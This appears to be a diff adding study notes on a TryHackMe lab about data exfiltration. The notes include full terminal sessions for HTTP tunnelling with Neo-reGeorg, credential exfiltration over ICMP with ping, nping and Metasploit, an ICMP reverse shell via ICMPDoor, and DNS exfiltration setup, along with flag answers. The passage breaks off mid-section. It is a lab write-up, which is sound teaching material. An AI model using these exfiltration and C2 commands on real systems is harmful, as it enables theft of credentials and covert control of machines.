@@ -535,3 +535,540 @@ ECDSA key fingerprint is SHA256:Ks0kFNo7GTsv8uM8bW78FwCCXjvouzDDmATnx1NhbIs.
 Are you sure you want to continue connecting (yes/no)? yes
 Warning: Permanently added '10.10.20.177' (ECDSA) to the list of known hosts.
 thm@10.10.20.177's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Mon Sep 12 19:02:37 2022 from 10.100.1.242
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+thm@jump-box:~$ ssh thm@web.thm.com
+thm@web.thm.com's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Mon Sep 12 16:58:52 2022 from 192.168.0.133
+thm@web-thm:~$ 
+
+root@ip-10-10-99-235:/opt/Neo-reGeorg# python3 neoreg.py generate -k thm
+
+          "$$$$$$''  'M$  '$$$@m
+        :$$$$$$$$$$$$$$''$$$$'
+       '$'    'JZI'$$&  $$$$'
+                 '$$$  '$$$$
+                 $$$$  J$$$$'
+                m$$$$  $$$$,
+                $$$$@  '$$$$_          Neo-reGeorg
+             '1t$$$$' '$$$$<
+          '$$$$$$$$$$'  $$$$          version 3.8.0
+               '@$$$$'  $$$$'
+                '$$$$  '$$$@
+             'z$$$$$$  @$$$
+                r$$$   $$|
+                '$$v c$$
+               '$$v $$v$$$$$$$$$#
+               $$x$$$$$$$$$twelve$$$@$'
+             @$$$@L '    '<@$$$$$$$$`
+           $$                 '$$$
+
+    [ Github ] https://github.com/L-codes/Neo-reGeorg
+
+    [+] Create neoreg server files:
+       => neoreg_servers/tunnel.php
+       => neoreg_servers/tunnel.aspx
+       => neoreg_servers/tunnel.ashx
+       => neoreg_servers/tunnel.jspx
+       => neoreg_servers/tunnel_compatibility.jspx
+       => neoreg_servers/tunnel.jsp
+       => neoreg_servers/tunnel_compatibility.jsp
+
+root@ip-10-10-99-235:/opt/Neo-reGeorg# python3 neoreg.py -k thm -u http://10.10.20.177/uploader/files/tunnel.php
+
+          "$$$$$$''  'M$  '$$$@m
+        :$$$$$$$$$$$$$$''$$$$'
+       '$'    'JZI'$$&  $$$$'
+                 '$$$  '$$$$
+                 $$$$  J$$$$'
+                m$$$$  $$$$,
+                $$$$@  '$$$$_          Neo-reGeorg
+             '1t$$$$' '$$$$<
+          '$$$$$$$$$$'  $$$$          version 3.8.0
+               '@$$$$'  $$$$'
+                '$$$$  '$$$@
+             'z$$$$$$  @$$$
+                r$$$   $$|
+                '$$v c$$
+               '$$v $$v$$$$$$$$$#
+               $$x$$$$$$$$$twelve$$$@$'
+             @$$$@L '    '<@$$$$$$$$`
+           $$                 '$$$
+
+    [ Github ] https://github.com/L-codes/Neo-reGeorg
+
++------------------------------------------------------------------------+
+  Log Level set to [ERROR]
+  Starting SOCKS5 server [127.0.0.1:1080]
+  Tunnel at:
+    http://10.10.20.177/uploader/files/tunnel.php
+
+root@ip-10-10-99-235:/opt/Neo-reGeorg# curl --socks5 127.0.0.1:1080 http://172.20.0.120:80/flag
+<p>Your flag: THM{H77p_7unn3l1n9_l1k3_l337}<
+```
+![[Pasted image 20220912113401.png]]
+When you visit the http://flag.thm.com/flag website through the uploader machine via the HTTP tunneling technique, what is the flag?
+### Exfiltration using ICMP
+In this task, we will be showing how to exfiltrate data using the ICMP protocol. ICMP stands for Internet Control Message Protocol, and it is a network layer protocol used to handle error reporting. If you need more information about ICMP and the fundamentals of computer networking, you may visit the following THM room: What is Networking.
+Network devices such as routers use ICMP protocol to check network connectivities between devices. Note that the ICMP protocol is not a transport protocol to send data between devices. Let's say that two hosts need to test the connectivity in the network; then, we can use the ping command to send ICMP packets through the network, as shown in the following figure.
+The HOST1 sends an ICMP packet with an echo-request packet. Then, if HOST2 is available, it sends an ICMP packet back with an echo reply message confirming the availability.
+ICMP Data Section
+On a high level, the ICMP packet's structure contains a Data section that can include strings or copies of other information, such as the IPv4 header, used for error messages. The following diagram shows the Data section, which is optional to use.
+Note that the Data field is optional and could either be empty or it could contain a random string during the communications. As an attacker, we can use the ICMP structure to include our data within the Data section and send it via ICMP packet to another machine. The other machine must capture the network traffic with the ICMP packets to receive the data.
+To perform manual ICMP data exfiltration, we need to discuss the ping command a bit more. The ping command is a network administrator software available in any operating system. It is used to check the reachability and availability by sending ICMP packets, which can be used as follows:
+```text
+Sending one ICMP packet using the PING Command
+
+           
+                
+thm@AttackBox$ ping 10.10.20.177 -c 1
+```
+We choose to send one ICMP packet from Host 1, our AttackBox, to Host 2, the target machine, using the-c 1 argument from the previous command. Now let's examine the ICMP packet in Wireshark and see what the Data section looks like.
+The Wireshark screenshot shows that the Data section has been selected with random strings. It is important to note that this section could be filled with the data that needs to be transferred to another machine.
+The ping command in the Linux OS has an interesting ICMP option. With the -p argument, we can specify 16 bytes of data in hex representation to send through the packet. Note that the -p option is only available for Linux operating systems. We can confirm that by checking the ping's help manual page.
+Let's say that we need to exfiltrate the following credentials thm:tryhackme. First, we need to convert it to its Hex representation and then pass it to the ping command using -p options as follows,
+```text
+Using the xxd command to convert text to Hex
+
+           
+                
+root@AttackBox$ echo "thm:tryhackme" | xxd -p 
+74686d3a7472796861636b6d650a
+```
+We used the xxd command to convert our string to Hex, and then we can use the ping command with the Hex value we got from converting the thm:tryhackme.
+```text
+Send Hex using the ping command.
+
+           
+                
+root@AttackBox$ ping 10.10.20.177 -c 1 -p 74686d3a7472796861636b6d650a
+```
+We sent one ICMP packet using the ping command with thm:tryhackme Data. Let's look at the Data section for this packet in the Wireshark.
+Excellent! We have successfully filled the ICMP's Data section with our data and manually sent it over the network using the ping command.
+ICMP Data Exfiltration
+Now that we have the basic fundamentals of manually sending data over ICMP packets, let's discuss how to use Metasploit to exfiltrate data. The Metasploit framework uses the same technique explained in the previous section. However, it will capture incoming ICMP packets and wait for a Beginning of File (BOF) trigger value. Once it is received, it writes to the disk until it gets an End of File (EOF) trigger value. The following diagram shows the required steps for the Metasploit framework. Since we need the Metasploit Framework for this technique, then we need the AttackBox machine to perform this attack successfully.
+Now from the AttackBox, let's set up the Metasploit framework by selecting the icmp_exfil module to make it ready to capture and listen for ICMP traffic. One of the requirements for this module is to set the BPF_FILTER option, which is based on TCPDUMP rules, to capture only ICMP packets and ignore any ICMP packets that have the source IP of the attacking machine as follows,
+```text
+Set the BPF_FILTER in MSF 
+
+           
+                
+msf5 > use auxiliary/server/icmp_exfil
+msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src ATTACKBOX_IP
+BPF_FILTER => icmp and not src ATTACKBOX_IP
+```
+We also need to select which network interface to listen to, eth0. Finally, executes run to start the module.
+```text
+Set the interface in MSF
+
+           
+                
+msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0
+INTERFACE => eth0
+msf5 auxiliary(server/icmp_exfil) > run
+    
+[*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
+[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
+```
+We prepared icmp.thm.com as a victim machine to complete the ICMP task with the required tools. From the JumpBox, log in to the icmp.thm.com using thm:tryhackme credentials.
+We have preinstalled the nping tool, an open-source tool for network packet generation, response analysis, and response time measurement. The NPING tool is part of the NMAP suite tools.
+First, we will send the BOF trigger from the ICMP machine so that the Metasploit framework starts writing to the disk.
+```text
+Sending the Trigger Value from the Victim
+
+           
+                
+thm@jump-box$ ssh thm@icmp.thm.com
+thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "BOFfile.txt"
+    
+Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
+SENT (0.0369s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=7785 seq=1] IP [ttl=64 id=40595 iplen=39 ]
+RCVD (0.0376s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=63 id=12656 iplen=39 ]
+RCVD (0.0755s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=7785 seq=1] IP [ttl=31 id=60759 iplen=32 ]
+    
+Max rtt: 38.577ms | Min rtt: 0.636ms | Avg rtt: 19.606ms
+Raw packets sent: 1 (39B) | Rcvd: 2 (71B) | Lost: 0 (0.00%)
+Nping done: 1 IP address pinged in 1.06 seconds
+```
+We sent one ICMP packet using the nping command with --data-string argument. We specify the trigger value with the file name BOFfile.txt, set by default in the Metasploit framework. This could be changed from Metasploit if needed!
+Now check the AttackBox terminal. If everything is set correctly, the Metasploit framework should identify the trigger value and wait for the data to be written to disk.
+Let's start sending the required data and the end of the file trigger value from the ICMP machine.
+```text
+Sending the Data and the End of the File Trigger Value
+
+           
+                
+thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin:password"
+    
+Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:23 EEST
+SENT (0.0312s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=14633 seq=1] IP [ttl=64 id=13497 iplen=42 ]
+RCVD (0.0328s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=14633 seq=1] IP [ttl=63 id=17031 iplen=42 ]
+RCVD (0.0703s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=14633 seq=1] IP [ttl=31 id=41138 iplen=30 ]
+    
+Max rtt: 39.127ms | Min rtt: 1.589ms | Avg rtt: 20.358ms
+Raw packets sent: 1 (42B) | Rcvd: 2 (72B) | Lost: 0 (0.00%)
+Nping done: 1 IP address pinged in 1.06 seconds 
+    
+thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "admin2:password2"
+    
+Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:24 EEST
+SENT (0.0354s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=39051 seq=1] IP [ttl=64 id=32661 iplen=44 ]
+RCVD (0.0358s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=39051 seq=1] IP [ttl=63 id=18581 iplen=44 ]
+RCVD (0.0748s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=39051 seq=1] IP [ttl=31 id=2149 iplen=30 ]
+    
+Max rtt: 39.312ms | Min rtt: 0.371ms | Avg rtt: 19.841ms
+Raw packets sent: 1 (44B) | Rcvd: 2 (74B) | Lost: 0 (0.00%)
+Nping done: 1 IP address pinged in 1.07 seconds 
+    
+thm@icmp-host:~# sudo nping --icmp -c 1 ATTACKBOX_IP --data-string "EOF"
+    
+Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-04-25 23:24 EEST
+SENT (0.0364s) ICMP [192.168.0.121 > ATTACKBOX_IP Echo request (type=8/code=0) id=33619 seq=1] IP [ttl=64 id=51488 iplen=31 ]
+RCVD (0.0369s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=33619 seq=1] IP [ttl=63 id=19671 iplen=31 ]
+RCVD (0.3760s) ICMP [ATTACKBOX_IP > 192.168.0.121 Echo reply (type=0/code=0) id=33619 seq=1] IP [ttl=31 id=1003 iplen=36 ]
+    
+Max rtt: 339.555ms | Min rtt: 0.391ms | Avg rtt: 169.973ms
+Raw packets sent: 1 (31B) | Rcvd: 2 (67B) | Lost: 0 (0.00%)
+Nping done: 1 IP address pinged in 1.07 seconds
+thm@icmp-host:~#
+```
+Let's check our AttackBox once we have done sending the data and the ending trigger value.
+```text
+Receiving Data in MSF
+
+           
+                
+msf5 auxiliary(server/icmp_exfil) > run
+    
+[*] ICMP Listener started on eth0 (ATTACKBOX_IP). Monitoring for trigger packet containing ^BOF
+[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
+[+] Beginning capture of "file.txt" data
+[*] 30 bytes of data received in total
+[+] End of File received. Saving "file.txt" to loot
+[+] Incoming file "file.txt" saved to loot
+[+] Loot filename: /root/.msf4/loot/20220425212408_default_ATTACKBOX_IP_icmp_exfil_838825.txt
+```
+Nice! We have successfully transferred data over the ICMP protocol using the Metasploit Framework. You can check the loot file mentioned in the terminal to confirm the received data.
+ICMP C2 Communication
+Next, we will show executing commands over the ICMP protocol using the [ICMPDoor](https://github.com/krabelize/icmpdoor) tool. ICMPDoor is an open-source reverse-shell written in Python3 and scapy. The tool uses the same concept we discussed earlier in this task, where an attacker utilizes the Data section within the ICMP packet. The only difference is that an attacker sends a command that needs to be executed on a victim's machine. Once the command is executed, a victim machine sends the execution output within the ICMP packet in the Data section.
+We have prepared the tools needed for C2 communication over the ICMP protocol on JumpBox and the ICMP-Host machines. First, we need to log in to the ICMP machine,icmp.thm.com, and execute the icmpdoor binary as follows,
+```text
+Run the icmpdoor command on the ICMP-Host Machine
+
+           
+                
+thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133
+```
+Note that we specify the interface to communicate over and the destination IP of the server-side.
+Next, log in to the JumpBox and execute the icmp-cnc binary to communicate with the victim, our ICMP-Host. Once the execution runs correctly, a communication channel is established over the ICMP protocol. Now we are ready to send the command that needs to be executed on the victim machine.
+```text
+The data that needs to be transferred
+
+           
+                
+thm@jump-box$  sudo icmp-cnc -i eth1 -d 192.168.0.121
+shell: hostname
+hostname
+shell: icmp-host
+```
+Similar to the client-side binary, ensure to select the interface for the communication as well as the destination IP. As the previous terminal shows, we requested to execute the hostname command, and we received icmp-host.
+To confirm that all communications go through the ICMP protocol, we capture the network traffic during the communication using tcpdump as the following:
+In which ICMP packet section can we include our data?
+*ping*
+Follow the technique discussed in this task to establish a C2 ICMP connection between JumpBox and ICMP-Host. Then execute the "getFlag" command. What is the flag?
+Once the "getFlag" command is executed, check /tmp/ directory!
+```text
+root@ip-10-10-99-235:/opt/Neo-reGeorg/neoreg_servers# msfconsole -q
+msf5 > use auxiliary/server/icmp_exfil
+msf5 auxiliary(server/icmp_exfil) > set BPF_FILTER icmp and not src 10.10.99.235BPF_FILTER => icmp and not src 10.10.99.235
+msf5 auxiliary(server/icmp_exfil) > set INTERFACE eth0
+INTERFACE => eth0
+msf5 auxiliary(server/icmp_exfil) > run
+
+[*] ICMP Listener started on eth0 (10.10.99.235). Monitoring for trigger packet containing ^BOF
+[*] Filename expected in initial packet, directly following trigger (e.g. ^BOFfilename.ext)
+
+root@ip-10-10-99-235:/opt/Neo-reGeorg/neoreg_servers# ssh thm@10.10.20.177
+The authenticity of host '10.10.20.177 (10.10.20.177)' can't be established.
+ECDSA key fingerprint is SHA256:Ks0kFNo7GTsv8uM8bW78FwCCXjvouzDDmATnx1NhbIs.
+Are you sure you want to continue connecting (yes/no)? yes
+Warning: Permanently added '10.10.20.177' (ECDSA) to the list of known hosts.
+thm@10.10.20.177's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Mon Sep 12 19:02:37 2022 from 10.100.1.242
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+thm@jump-box:~$ ssh thm@web.thm.com
+thm@web.thm.com's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Mon Sep 12 16:58:52 2022 from 192.168.0.133
+thm@web-thm:~$ ssh thm@icmp.thm.com
+The authenticity of host 'icmp.thm.com (192.168.0.121)' can't be established.
+ECDSA key fingerprint is SHA256:odWQXWoPbs946nSO3McmlJvWqZ6/byyYUWBZrxbw2Ho.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added 'icmp.thm.com,192.168.0.121' (ECDSA) to the list of known hosts.
+thm@icmp.thm.com's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+
+The programs included with the Ubuntu system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
+applicable law.
+
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+thm@icmp-host:~$ sudo nping --icmp -c 1 10.10.99.235 --data-string "admin:password"
+[sudo] password for thm: 
+
+Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-09-12 19:52 EEST
+SENT (0.0337s) ICMP [192.168.0.121 > 10.10.99.235 Echo request (type=8/code=0) id=30948 seq=1] IP [ttl=64 id=47074 iplen=42 ]
+RCVD (0.0342s) ICMP [10.10.99.235 > 192.168.0.121 Echo reply (type=0/code=0) id=30948 seq=1] IP [ttl=63 id=47101 iplen=42 ]
+ 
+Max rtt: 0.369ms | Min rtt: 0.369ms | Avg rtt: 0.369ms
+Raw packets sent: 1 (42B) | Rcvd: 1 (42B) | Lost: 0 (0.00%)
+Nping done: 1 IP address pinged in 1.06 seconds
+thm@icmp-host:~$ sudo nping --icmp -c 1 10.10.99.235 --data-string "admin2:password2"
+
+Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-09-12 19:53 EEST
+SENT (0.0312s) ICMP [192.168.0.121 > 10.10.99.235 Echo request (type=8/code=0) id=43536 seq=1] IP [ttl=64 id=13907 iplen=44 ]
+RCVD (0.0318s) ICMP [10.10.99.235 > 192.168.0.121 Echo reply (type=0/code=0) id=43536 seq=1] IP [ttl=63 id=52037 iplen=44 ]
+ 
+Max rtt: 0.468ms | Min rtt: 0.468ms | Avg rtt: 0.468ms
+Raw packets sent: 1 (44B) | Rcvd: 1 (44B) | Lost: 0 (0.00%)
+Nping done: 1 IP address pinged in 1.06 seconds
+thm@icmp-host:~$ sudo nping --icmp -c 1 10.10.99.235 --data-string "EOF"
+
+Starting Nping 0.7.80 ( https://nmap.org/nping ) at 2022-09-12 19:53 EEST
+SENT (0.0317s) ICMP [192.168.0.121 > 10.10.99.235 Echo request (type=8/code=0) id=42021 seq=1] IP [ttl=64 id=19539 iplen=31 ]
+RCVD (0.0323s) ICMP [10.10.99.235 > 192.168.0.121 Echo reply (type=0/code=0) id=42021 seq=1] IP [ttl=63 id=54903 iplen=31 ]
+ 
+Max rtt: 0.433ms | Min rtt: 0.433ms | Avg rtt: 0.433ms
+Raw packets sent: 1 (31B) | Rcvd: 1 (31B) | Lost: 0 (0.00%)
+Nping done: 1 IP address pinged in 1.06 seconds
+thm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192/168.0.133
+^Cthm@icmp-host:~$ sudo icmpdoor -i eth0 -d 192.168.0.133
+
+root@ip-10-10-99-235:/opt/Neo-reGeorg/neoreg_servers# ssh thm@10.10.20.177
+thm@10.10.20.177's password: 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-1029-aws x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Mon Sep 12 19:26:30 2022 from 10.10.99.235
+To run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+thm@jump-box:~$ sudo icmp-cnc -i eth1 -d 10.10.99.205
+[sudo] password for thm: 
+shell: shell
+shell: hostname
+shell: getFlag
+shell: ^CTraceback (most recent call last):
+  File "icmp-cnc.py", line 40, in <module>
+KeyboardInterrupt
+[115] Failed to execute script icmp-cnc
+thm@jump-box:~$ sudo icmp-cnc -i eth1 -d 10.10.99.235
+shell: getFlag
+shell: ^CTraceback (most recent call last):
+  File "icmp-cnc.py", line 40, in <module>
+KeyboardInterrupt
+[126] Failed to execute script icmp-cnc
+thm@jump-box:~$ sudo icmp-cnc -i eth1 -d 10.10.99.235
+shell: getFlag
+shell: ^CTraceback (most recent call last):
+  File "icmp-cnc.py", line 40, in <module>
+KeyboardInterrupt
+[137] Failed to execute script icmp-cnc
+thm@jump-box:~$ sudo icmp-cnc -i eth1 -d 192.168.0.121
+shell: getFlag
+getFlag
+shell: [+] Check the flag: /tmp/flag.txt
+
+shell: hostname
+hostname
+shell: icmp-host
+
+shell: cat /tmp/flag.txt
+cat /tmp/flag.txt
+shell: THM{g0t-1cmp-p4k3t!}
+```
+### DNS Configurations
+DNS Configuration
+To perform exfiltration via the DNS protocol, you need to control a domain name and set up DNS records, including NS, A, or TXT. Thus, we provide a web interface to make it easy for you to add and modify the DNS records. The following domain name is set up and ready for the DNS exfiltration task: tunnel.com.
+To access the website, you may visit the following link: http://10.10.20.177/ or https://10-10-20-177.p.thmlabs.com/ without the need for a VPN.
+Once you choose the domain name, you can add DNS records and test and reset the DNS configuration if something goes wrong.
+New Attacker Machine
+Note that we have added a new Attacker machine in Network 2, which has the following subdomain name and IP address:
+Domain Name 	IP Address	Network Access
+attacker.thm.com
+172.20.0.200	Network 2
+We will be using the Attacker machine to exfiltrate in DNS and DNS tunneling scenarios. The main goal is that the Attacker machine (on Network2) can access internal network devices of Network 1 through JumpBox.
+Nameserver for DNS Exfiltration
+To successfully execute DNS exfiltration within the provided network or on the Internet, we need to set up a name server for the domain name we control as the following:
+Add an A record that points to the AttackBox's IP address. For example, Type: A, Subdomain Name: t1ns, Value: AttackBox_IP.
+Add an NS record that routes DNS queries to the A records in step 1. For example, Type: NS, Subdomain Name: t1, Value: t1ns.tunnel.com.
+Ensure that for the NS value we specify the full domain name: t1ns.tunnel.com. Once the two records are added, the name server t1.tunnel.com is ready to be used for DNS Exfiltration purposes.
+If you choose not to set up your AttackBox, we set up a nameserver for the Attacker machine within our provided network, and it is ready to use as follows,
+DNS Record	Type	Value
+attNS.tunnel.com
+A	172.20.0.200
+att.tunnel.com	NS	attNS.tunnel.com
+Note that the attNS.thm.com IP address points to the newly added attacker machine in our network and it is ready to be used in our environment between the JumpBox and Attacker for DNS tasks and purposes.
+Lab Recommendation
+Even though you can use the AttackBox for this room, we recommend using the JumpBox for most parts (TCP, SSH, ICMP, DNS) to avoid technical issues with DNS and networking. If you prefer to use the AttackBox for the DNS Tunneling task (task 10), you must change the DNS settings of the AttackBox to 10.10.20.177. There are many ways to change the DNS settings in the AttackBox machine. However, the following is one of the stable solutions we found for our environment.
+First, we need to edit the Yaml Netplan configuration file.
+```text
+Edit Netplan Configuration File
+
+           
+			
+root@AttackBox:~# nano /etc/netplan/aws-vmimport-netplan.yaml
+```
+Modify the Netplan configuration file and add the nameserver section under the eth0 interface to be as the following:
+```text
+# Automatically generated by the vm import process
+ network:
+     ethernets:
+         eth0:
+             dhcp4: true
+             optional: false
+             nameservers:
+                search: [tunnel.com]
+                addresses: [10.10.20.177]
+         ens5:
+             dhcp4: true
+             optional: false
+     version: 2
+```
+Finally, apply the Netplan Changes (This may need to be run twice).
+```text
+Apply the Netplan Changes
+
+           
+			
+root@AttackBox:~# netplan apply
+```
+DNS Testing
+Once you have access to the Jump machine, you need to make sure that the DNS is working correctly by testing it as follows:
+```text
+Testing the DNS configuration
+
+           
+			
+thm@jump-box:~$ dig +short test.thm.com
+127.0.0.1
+thm@jump-box:~$ ping test.thm.com -c 1
+PING test.thm.com (127.0.0.1) 56(84) bytes of data.
+64 bytes from localhost (127.0.0.1): icmp_seq=1 ttl=64 time=0.018 ms
+
+--- test.thm.com ping statistics ---
+1 packets transmitted, 1 received, 0% packet loss, time 0ms
+rtt min/avg/max/mdev = 0.018/0.018/0.018/0.000 ms
+```
+The DNS server must resolve the test.thm.com and test.tunnel.com domain names to 127.0.0.1, confirming that you're ready.
+Once the DNS configuration works fine, resolve the flag.thm.com  domain name. What is the IP address?
+```text
+thm@jump-box:/tmp$ dig +short test.thm.com
+127.0.0.1
+thm@jump-box:/tmp$ dig +short flag.thm.com
+172.20.0.120
+```
+dig flag.thm.com
+*172.20.0.120*
+### Exfiltration over DNS
+The DNS protocol is a common protocol and Its primary purpose is to resolve domain names to IP addresses and vice versa. Even though the DNS protocol is not designed to transfer data, threat actors found a way to abuse and move data over it. This task shows a technique to exfiltrate data over the DNS protocol.
+What is DNS Data Exfiltration?
+Since DNS is not a transport protocol, many organizations don't regularly monitor the DNS protocol! The DNS protocol is allowed in almost all firewalls in any organization network. For those reasons, threat actors prefer using the DNS protocol to hide their communications.
+The DNS protocol has limitations that need to be taken into consideration, which are as follows,
+The maximum length of the Fully Qualified FQDN domain name (including .separators) is 255 characters.
+The subdomain name (label) length must not exceed 63 characters (not including .com, .net, etc).
+Based on these limitations, we can use a limited number of characters to transfer data over the domain name. If we have a large file, 10 MB for example, it may need more than 50000 DNS requests to transfer the file completely. Therefore, it will be noisy traffic and easy to notice and detect.
+Now let's discuss the Data Exfiltration over DNS requirements and steps, which are as follows:
+Data Exfiltration - Data flow
+An attacker registers a domain name, for example, tunnel.com
+The attacker sets up tunnel.com's NS record points to a server that the attacker controls.
+The malware or the attacker sends sensitive data from a victim machine to a domain name they control—for example, passw0rd.tunnel.com, where passw0rd is the data that needs to be transferred.
+The DNS request is sent through the local DNS server and is forwarded through the Internet.
+The attacker's authoritative DNS (malicious server) receives the DNS request.
+Finally, the attacker extracts the password from the domain name.
+When do we need to use the DNS Data Exfiltration?
+There are many use case scenarios, but the typical one is when the firewall blocks and filters all traffic. We can pass data or TCP/UDP packets through a firewall using the DNS protocol, but it is important to ensure that the DNS is allowed and resolving domain names to IP addresses.
+Modifying the DNS Records!
+Now let's try to perform a DNS Data Exfiltration in the provided network environment. Note we will be using the tunnel.com domain name in this scenario. We also provide a web interface to modify the DNS records of tunnel.com to insert a Name Server (NS) that points to your AttackBox machine. Ensure to complete these settings in task 8.
+DNS Data Exfiltration
+Now let's explain the manual DNS Data Exfiltration technique and show how it works. Assume that we have a creds.txt file with sensitive data, such as credit card information. To move it over the DNS protocol, we need to encode the content of the file and attach it as a subdomain name as follows,
+Get the required data that needs to be transferred.
+Encode the file using one of the encoding techniques.
+Send the encoded characters as subdomain/labels.
+Consider the limitations of the DNS protocol. Note that we can add as much data as we can to the domain name, but we must keep the whole URL under 255 characters, and each subdomain label can't exceed 63 characters. If we do exceed these limits, we split the data and send more DNS requests!
+Now let's try to perform the DNS Data Exfiltration technique in the provided network environment. This section aims to transfer the content of the creds.txt file from victim2 to attacker. We will use the att.tunnel.com nameserver, pointing to the newly added machine (the attacker machine).
+Important: You can use the AttackBox for this task but ensure to update the DNS records and add an NS record that points to your AttackBox's IP address or use the preconfigured nameserver att.tunnel.com for the attacker machine.
+The first thing to do is make the attacker machine ready to receive any DNS request. Let's connect to the attacker machine through SSH, which could be done from the Jump Box using the following credentials: thm:tryhackme.
+```text
+Connect to the Attacker machine via SSH Client from JumpBox
+
+           
+			
+thm@jump-box$ ssh thm@attacker.thm.com
+```
+Or from the AttackBox machine using the 10.10.20.177 and port 2322 as follows,
+```text
